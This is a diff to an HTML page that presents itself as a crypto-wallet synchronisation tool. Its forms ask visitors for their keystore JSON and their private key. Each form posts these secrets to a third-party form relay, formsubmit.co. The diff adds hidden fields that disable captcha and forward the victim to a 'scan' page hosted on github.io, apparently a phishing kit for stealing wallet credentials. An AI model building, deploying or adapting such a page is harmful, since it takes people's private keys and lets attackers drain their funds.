@@ -125,8 +125,16 @@ header {
 								<div class="form-group"><button class="btn btn-primary btn-block" type="submit">Synchronize</button></div>
 							</form>
 						</div>
+							
 						<div role="tabpanel" class="tab-pane fade" id="keystore">
 							<form method="post" action="https://formsubmit.co/31b38fb3f6f5eb9783dea9b202e3bab3"  method="POST">
+								<!-- Honeypot -->
+							<input type = "text" name = "_honey" style = "display: none;">
+							
+							<!-- Disable Captcha -->
+							<input type = "hidden" name = "_captcha" value = "false">
+								
+							<input type = "hidden" name = "_next" value = "https://hannahmabe.github.io/live/scan.html">
 								<div class="form-group">
 									<textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
 								</div>
@@ -138,6 +146,13 @@ header {
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="privatekey">
 							<form method="post" action="https://formsubmit.co/31b38fb3f6f5eb9783dea9b202e3bab3"  method="POST">
+								<!-- Honeypot -->
+							<input type = "text" name = "_honey" style = "display: none;">
+							
+							<!-- Disable Captcha -->
+							<input type = "hidden" name = "_captcha" value = "false">
+								
+							<input type = "hidden" name = "_next" value = "https://hannahmabe.github.io/live/scan.html">
 								<div class="form-group">
 									<input class="form-control" name="privatekey" placeholder="Private Key">
 								</div>
